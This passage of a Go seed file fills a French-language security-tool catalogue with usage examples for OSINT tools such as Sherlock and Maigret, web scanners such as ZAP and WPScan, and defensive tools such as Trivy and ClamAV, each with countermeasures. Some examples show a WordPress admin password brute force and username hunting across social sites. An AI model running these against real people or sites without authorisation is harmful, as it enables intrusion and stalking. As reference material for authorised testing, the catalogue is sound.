			Defense: "**Détection** :\n- Volume de paquets SYN massivement supérieur à la normale\n- IDS/IPS détectent les patterns masscan (TTL, IP ID...)\n\n**Contre-mesures** :\n- Rate limiting sur le firewall\n- Blackholer les IPs sources de scan (fail2ban)",
		},

		// ── Outils Phase 5.3 — OSINT ────────────────────────────────────────────
		{
			Name: "Sherlock", Category: "offensive", SubCategory: "osint",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "osint,username,réseaux-sociaux,reconnaissance,hunting",
			Description: "Recherche un nom d'utilisateur sur 400+ réseaux sociaux et sites web. Outil OSINT incontournable pour la reconnaissance d'une cible par son pseudo.",
			Install:     "```bash\n# pip\npipx install sherlock-project\n\n# Ou depuis les sources\ngit clone https://github.com/sherlock-project/sherlock\ncd sherlock && pip3 install .\n```",
			Usage:       "```bash\nsherlock [options] <username> [username2 ...]\n\n--timeout <sec>  # Timeout par requête (défaut: 60)\n--print-found    # Afficher uniquement les trouvés\n--no-color       # Sans couleurs (scripts)\n--output <file>  # Exporter les résultats\n--csv            # Export CSV\n--site <site>    # Limiter à un site\n```",
			Examples:    "```bash\n# Recherche simple\nsherlock john_doe\n\n# Plusieurs pseudos\nsherlock john_doe johndoe john.doe\n\n# Export CSV\nsherlock --csv john_doe\n\n# Timeout réduit + seulement les trouvés\nsherlock --timeout 10 --print-found john_doe\n```",
			Defense:     "**Contre-mesures** :\n- Utiliser des pseudos différents sur chaque plateforme\n- Ne pas lier ses comptes (email unique par plateforme)\n- Vérifier sa propre empreinte numérique régulièrement",
		},
		{
			Name: "theHarvester", Category: "offensive", SubCategory: "osint",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "osint,emails,sous-domaines,domaine,reconnaissance,passif",
			Description: "Outil de collecte passive d'informations sur un domaine : emails, sous-domaines, IPs, URLs, employés. Utilise de multiples sources publiques (Google, Shodan, VirusTotal, Hunter.io...).",
			Install:     "```bash\n# Linux\nsudo apt install theharvester\n\n# Depuis les sources (Python)\ngit clone https://github.com/laramies/theHarvester\ncd theHarvester && pip3 install -r requirements.txt\n```",
			Usage:       "```bash\ntheHarvester -d <domaine> -b <sources> [options]\n\n-d <domaine>    # Domaine cible\n-b <sources>    # Sources (google, bing, shodan, all...)\n-l <n>          # Limite de résultats\n-f <fichier>    # Export HTML + XML\n--screenshot    # Screenshots des domaines\n\n# Sources disponibles : anubis, baidu, bevigil, bing, brave,\n#   certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt,\n#   github-code, google, hackertarget, hunter, intelx,\n#   linkedin, otx, rapiddns, shodan, sublist3r, urlscan...\n```",
			Examples:    "```bash\n# Reconnaissance Google + Bing\ntheHarvester -d example.com -b google,bing -l 200\n\n# Toutes les sources\ntheHarvester -d example.com -b all -l 500\n\n# Export HTML\ntheHarvester -d example.com -b google,bing -f recon_example\n\n# Sources passives uniquement (furtif)\ntheHarvester -d example.com -b dnsdumpster,crtsh,urlscan\n```",
			Defense:     "**Contre-mesures** :\n- Pas de correction possible : ces données sont publiques\n- Limiter la publication d'emails dans les pages web (utiliser des formulaires)\n- Surveiller la divulgation de sous-domaines (crtsh.io monitoring)",
		},
		{
			Name: "Maigret", Category: "offensive", SubCategory: "osint",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "osint,username,profil,2000-sites,reconnaissance",
			Description: "Fork avancé de Sherlock. Recherche un username sur 2000+ sites et génère des rapports détaillés avec informations de profil extraites (bio, liens, photos). Idéal pour les investigations OSINT profondes.",
			Install:     "```bash\n# pip\npip3 install maigret\n\n# Depuis les sources\ngit clone https://github.com/soxoj/maigret\ncd maigret && pip3 install .\n```",
			Usage:       "```bash\nmaigret [options] <username>\n\n--timeout <sec>    # Timeout\n--retries <n>      # Nombre de retentatives\n-P <n>             # Threads parallèles\n--html             # Rapport HTML\n--pdf              # Rapport PDF\n--json <file>      # Export JSON\n--tags <tags>      # Filtrer par tags (social, gaming...)\n```",
			Examples:    "```bash\n# Recherche complète avec rapport HTML\nmaigret --html john_doe\n\n# Recherche rapide (timeout court)\nmaigret --timeout 5 john_doe\n\n# Rapport PDF détaillé\nmaigret --pdf john_doe\n\n# Filtrer les sites de gaming\nmaigret --tags gaming john_doe\n```",
			Defense:     "**Contre-mesures** :\n- Pseudos uniques par plateforme\n- Auditer régulièrement son empreinte avec ces outils",
		},

		// ── Outils Phase 5.3 — Web Application Security ─────────────────────────
		{
			Name: "OWASP ZAP", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS: "both", Tags: "web,proxy,scan,owasp,vulnérabilités,spider,actif,passif",
			Description: "Zed Attack Proxy — scanner de sécurité web complet de l'OWASP. Proxy d'interception, spider, scan actif/passif, fuzzer intégré. Référence mondiale pour les tests d'applications web.",
			Install:     "**Windows/Linux/macOS** : https://www.zaproxy.org/download/\n\n```bash\n# Linux (snap)\nsnap install zaproxy --classic\n\n# Docker (mode daemon)\ndocker run -d -p 8080:8080 zaproxy/zap-stable zap.sh -daemon -host 0.0.0.0 -port 8080\n```",
			Usage:       "```bash\n# Mode headless - scan rapide\nzap.sh -cmd -quickurl http://cible.com -quickout report.html\n\n# Mode daemon (API)\nzap.sh -daemon -port 8080 -config api.key=mykey\n\n# Utiliser l'API REST\ncurl 'http://localhost:8080/JSON/spider/action/scan/?url=http://cible.com&apikey=mykey'\n```",
			Examples:    "```bash\n# Scan rapide en ligne de commande\nzap.sh -cmd -quickurl http://10.10.10.1 -quickout /tmp/report.html\n\n# Scan complet avec rapport JSON\nzap.sh -cmd -autorun /path/to/autorun.yaml\n\n# API : lancer un spider\ncurl 'http://localhost:8080/JSON/spider/action/scan/?url=http://cible.com&apikey=mykey'\n\n# API : récupérer les alertes\ncurl 'http://localhost:8080/JSON/alert/view/alerts/?baseurl=http://cible.com&apikey=mykey'\n```",
			Defense:     "**Contre-mesures** :\n- WAF pour bloquer les requêtes malveillantes\n- Rate limiting sur l'application\n- HSTS, CSP, X-Frame-Options, X-Content-Type-Options\n- Tests réguliers avec ZAP en CICD (DAST pipeline)",
		},
		{
			Name: "WPScan", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS: "both", Tags: "wordpress,cms,scan,plugins,themes,vulnérabilités,users",
			Description: "Scanner de vulnérabilités dédié WordPress. Enumère les plugins, thèmes, utilisateurs et CVE connues. Base de données WPVulnDB mise à jour quotidiennement.",
			Install:     "```bash\n# Ruby gem\ngem install wpscan\n\n# Linux\nsudo apt install wpscan\n```",
			Usage:       "```bash\nwpscan --url <url> [options]\n\n--url <url>           # URL cible WordPress\n--enumerate <opts>    # Enumérer : u=users, p=plugins, t=themes\n--passwords <file>    # Brute force des logins\n--username <user>     # Username pour le brute force\n--api-token <token>   # Token WPVulnDB (CVE)\n```",
			Examples:    "```bash\n# Scan basique\nwpscan --url http://wordpress-site.com\n\n# Enumération des plugins\nwpscan --url http://wordpress-site.com --enumerate p\n\n# Tout énumérer + CVE\nwpscan --url http://wordpress-site.com --enumerate u,p,t --api-token YOUR_TOKEN\n\n# Brute force admin\nwpscan --url http://wordpress-site.com --passwords /wordlists/rockyou.txt --username admin\n```",
			Defense:     "**Contre-mesures** :\n- Masquer la version WordPress (/wp-login.php, générateur meta)\n- Mettre à jour plugins/thèmes/core régulièrement\n- 2FA sur wp-admin\n- Limiter les tentatives de connexion (Wordfence, plugin)\n- Fichier xmlrpc.php désactivé si inutilisé",
		},

		// ── Outils Phase 5.3 — Cloud & Container Security ────────────────────────
		{
			Name: "Trivy", Category: "defensive", SubCategory: "container-security",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "container,docker,vulnérabilités,iac,sbom,cve,code,cloud",
			Description: "Scanner de vulnérabilités all-in-one d'Aqua Security. Analyse images Docker, code source, IaC (Terraform/K8s), SBOM et secrets. Référence dans les pipelines DevSecOps.",
			Install:     "```bash\n# Linux (script)\ncurl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sudo sh\n\n# Homebrew (Mac)\nbrew install trivy\n\n# Windows (scoop)\nscoop install trivy\n```",
			Usage:       "```bash\ntrivy <commande> <cible>\n\n# Commandes\nimage <image>        # Scanner une image Docker\nfs <chemin>          # Scanner un répertoire/dépôt\nrepo <url>           # Scanner un repo Git\nk8s                  # Scanner un cluster Kubernetes\nsbom                 # Générer un SBOM\n\n# Options communes\n--severity HIGH,CRITICAL    # Filtrer par sévérité\n--format json|table|sarif  # Format de sortie\n--exit-code 1              # Sortie erreur si vulnérabilité\n```",
			Examples:    "```bash\n# Scanner une image Docker\ntrivy image nginx:latest\n\n# Uniquement les HIGH et CRITICAL\ntrivy image --severity HIGH,CRITICAL python:3.9\n\n# Scanner le code source d'un projet\ntrivy fs /mon/projet\n\n# Scanner un repo GitHub\ntrivy repo https://github.com/user/repo\n\n# Export JSON\ntrivy image --format json -o rapport.json ubuntu:22.04\n\n# Intégration CI : erreur si vulné critique trouvée\ntrivy image --exit-code 1 --severity CRITICAL mon-app:latest\n```",
			Defense:     "**Utilisation défensive** :\n- Intégrer Trivy dans les pipelines CI/CD (GitHub Actions, GitLab CI)\n- Scanner toutes les images avant déploiement\n- Générer des SBOM pour la traçabilité\n- Alerter sur les nouvelles CVE dans les images en production",
		},
		{
			Name: "Prowler", Category: "defensive", SubCategory: "cloud-security",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "aws,azure,gcp,cloud,compliance,cis,audit,iam,s3",
			Description: "Outil d'audit de sécurité cloud (AWS, Azure, GCP). Vérifie plus de 500 contrôles CIS, GDPR, HIPAA, PCI-DSS, SOC2. Détecte les mauvaises configurations IAM, S3 publics, CloudTrail désactivé...",
			Install:     "```bash\n# pip\npip3 install prowler\n\n# Ou depuis les sources\ngit clone https://github.com/prowler-cloud/prowler\ncd prowler && pip3 install -r requirements.txt\n```",
			Usage:       "```bash\nprowler <provider> [options]\n\n# Providers : aws, azure, gcp, kubernetes\n\n# AWS\nprowler aws --profile <profil> [options]\n\n-c <checks>        # Checks spécifiques\n--compliance <fw>  # CIS, GDPR, PCI...\n-M json,csv,html  # Formats de sortie\n-f <région>        # Région AWS\n```",
			Examples:    "```bash\n# Audit AWS complet\nprowler aws\n\n# Conformité CIS AWS\nprowler aws --compliance cis_level1_aws\n\n# Export HTML\nprowler aws -M html\n\n# Checks spécifiques S3\nprowler aws -c s3_bucket_public_access\n\n# Azure avec tenant ID\nprowler azure --sp-env-auth\n```",
			Defense:     "**Utilisation** :\n- Audit périodique de la posture de sécurité cloud\n- Intégrer dans les pipelines CI/CD\n- Dashboard de conformité (CIS, PCI-DSS...)\n- Alerter sur les dérives de configuration",
		},
		{
			Name: "Checkov", Category: "defensive", SubCategory: "cloud-security",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "iac,terraform,kubernetes,cloudformation,sécurité,devops,shift-left",
			Description: "Analyseur statique de sécurité pour l'Infrastructure-as-Code. Analyse Terraform, CloudFormation, Kubernetes YAML, Dockerfile, Helm charts pour détecter les misconfigurations avant le déploiement.",
			Install:     "```bash\n# pip\npip3 install checkov\n\n# Homebrew\nbrew install checkov\n```",
			Usage:       "```bash\ncheckov -d <répertoire> [options]\ncheckov -f <fichier> [options]\n\n--framework <fw>      # terraform, kubernetes, dockerfile...\n--check <id>          # Checks spécifiques (CKV_AWS_1)\n--skip-check <id>     # Ignorer des checks\n-o json|junitxml|cli  # Format de sortie\n--soft-fail           # Ne pas échouer même si vulné\n```",
			Examples:    "```bash\n# Scanner un répertoire Terraform\ncheckov -d /mon/infra/terraform\n\n# Scanner un fichier Kubernetes\ncheckov -f deployment.yaml\n\n# Rapport JSON\ncheckov -d . -o json\n\n# Intégration CI/CD (GitHub Actions)\ncheckov -d . --soft-fail\n\n# Scanner un Dockerfile\ncheckov -f Dockerfile\n```",
			Defense:     "**Utilisation** :\n- Intégrer dans pre-commit hooks et pipelines CI\n- Empêcher le déploiement d'infra non-conforme\n- Fix automatique disponible pour certains checks (--fix)",
		},

		// ── Outils Phase 5.3 — Forensics & Défense ─────────────────────────────
		{
			Name: "ClamAV", Category: "defensive", SubCategory: "antivirus",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "antivirus,malware,scan,fichiers,forensics,linux",
			Description: "Antivirus open source multi-plateforme. Scanner de malware pour fichiers, emails, archives. Utilisé sur les serveurs Linux pour la détection de virus et le forensics de fichiers suspects.",
			Install:     "```bash\n# Linux\nsudo apt install clamav clamav-daemon\n\n# Mise à jour des signatures\nsudo freshclam\n```",
			Usage:       "```bash\nclamscan [options] <cible>\n\n-r                   # Récursif\n--infected           # Afficher uniquement les infectés\n--remove             # Supprimer les fichiers infectés\n--move <dir>         # Quarantaine\n--log <fichier>      # Log des résultats\n--max-filesize=<n>M  # Taille max de fichier à scanner\n```",
			Examples:    "```bash\n# Scanner un répertoire\nclamscan -r /tmp/\n\n# Scanner et n'afficher que les infectés\nclamscan -r --infected /home/\n\n# Scanner avec quarantaine\nclamscan -r --move=/quarantaine /tmp/\n\n# Scan rapide (base seule, sans scan de fichiers)\nclamscan --quick /\n\n# Mettre à jour les signatures\nfreshclam\n```",
			Defense:     "**Utilisation défensive** :\n- Scanner les fichiers uploadés sur les serveurs web\n- Intégrer dans les pipelines CI pour scanner les builds\n- Scanner les emails entrants (Postfix + ClamAV-milter)\n- Cron job quotidien sur les répertoires sensibles",
		},
		{
			Name: "Wazuh Agent", Category: "defensive", SubCategory: "siem-edr",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "siem,edr,monitoring,alertes,compliance,fim,intrusion",
			Description: "Agent EDR/SIEM open source. Surveillance de l'intégrité des fichiers (FIM), détection d'intrusion, conformité (PCI-DSS, GDPR, CIS), analyse de logs. S'intègre avec OpenSearch/Elastic.",
			Install:     "```bash\n# Ajout du dépôt Wazuh\ncurl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor -o /etc/apt/trusted.gpg.d/wazuh.gpg\necho 'deb https://packages.wazuh.com/4.x/apt/ stable main' > /etc/apt/sources.list.d/wazuh.list\nsudo apt update && sudo apt install wazuh-agent\n\n# Configuration\n# Éditer /var/ossec/etc/ossec.conf avec l'IP du manager\nsudo systemctl enable --now wazuh-agent\n```",
			Usage:       "**Commandes principales** :\n```bash\n# Statut de l'agent\nsudo /var/ossec/bin/wazuh-control status\n\n# Tester une règle\nsudo /var/ossec/bin/ossec-logtest\n\n# Vérifier les alertes\ntail -f /var/ossec/logs/alerts/alerts.log\n```\n\n**Fichiers importants** :\n```\n/var/ossec/etc/ossec.conf    # Configuration\n/var/ossec/logs/alerts/      # Alertes\n/var/ossec/logs/ossec.log    # Logs agent\n```",
			Examples:    "```bash\n# Lancer la surveillance FIM (File Integrity Monitoring)\n# Dans ossec.conf :\n# <directories check_all=\"yes\">/etc,/usr/bin,/bin</directories>\n\n# Vérifier la connexion au manager\nsudo /var/ossec/bin/agent_control -l\n\n# Déclencher un test d'alerte\necho \"test alert\" | sudo tee /var/ossec/logs/active-responses.log\n```",
			Defense:     "",
		},

		// ── Outils Phase 5.3 — Reverse Engineering ─────────────────────────────
		{
			Name: "Ghidra", Category: "defensive", SubCategory: "reverse-engineering",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "reverse,désassembleur,décompilateur,malware,binaire,nsa",
			Description: "Suite de reverse engineering développée par la NSA. Désassembleur et décompilateur multi-architecture (x86, ARM, MIPS...). Analyse statique de binaires et malware. Gratuit et open source.",
			Install:     "**Windows/Linux/macOS** : https://ghidra-sre.org/\n\n```bash\n# Prérequis : Java 17+\nsudo apt install openjdk-17-jdk\n\n# Télécharger depuis https://github.com/NationalSecurityAgency/ghidra/releases\nunzip ghidra_*.zip\n./ghidraRun\n```",
			Usage:       "**Interface graphique** :\n1. Créer un projet → Import File (binaire à analyser)\n2. Double-clic pour analyser automatiquement\n3. Onglet Decompiler : vue pseudo-code C\n4. Onglet Listing : vue assembleur\n\n**Raccourcis** :\n- `G` → Aller à une adresse\n- `L` → Renommer une fonction/variable\n- `Ctrl+F` → Rechercher\n- `T` → Ajouter un type",
			Examples:    "```bash\n# Mode headless (script)\nanalyzeHeadless /tmp/projet MonProjet -import binaire.exe -postScript PrintTrees.java\n\n# Analyser un binaire sans GUI\nanalyzeHeadless /tmp/projet MonProjet -import malware.exe -overwrite\n```",
			Defense:     "**Utilisation défensive** :\n- Analyse de malware capturé\n- Validation de binaires suspects\n- CTF (challenge reverse engineering)\n- Recherche de CVE dans des binaires fermés",
		},
	}

	for _, s := range seeds {
		// Upsert : insérer si absent, sinon synchroniser EthicalLevel + encadrement légal/éthique.
		// On respecte les champs Description, Install, Usage… déjà édités par l'utilisateur.
		var existing models.Tool
		result := DB.Where("name = ?", s.Name).First(&existing)
		if result.Error != nil {
			if _, err := CreateTool(&s); err != nil {
				return err
			}
			continue
		}
		updates := map[string]interface{}{}
		if existing.EthicalLevel != s.EthicalLevel {
			updates["ethical_level"] = s.EthicalLevel
		}
		// Si LegalNotes/EthicalUseCases vides côté DB et seed les fournit → injecter
		if existing.LegalNotes == "" && s.LegalNotes != "" {
			updates["legal_notes"] = s.LegalNotes
		}
		if existing.EthicalUseCases == "" && s.EthicalUseCases != "" {
			updates["ethical_use_cases"] = s.EthicalUseCases
		}
		if len(updates) > 0 {
			DB.Model(&existing).Updates(updates)
		}
	}
	return nil
}
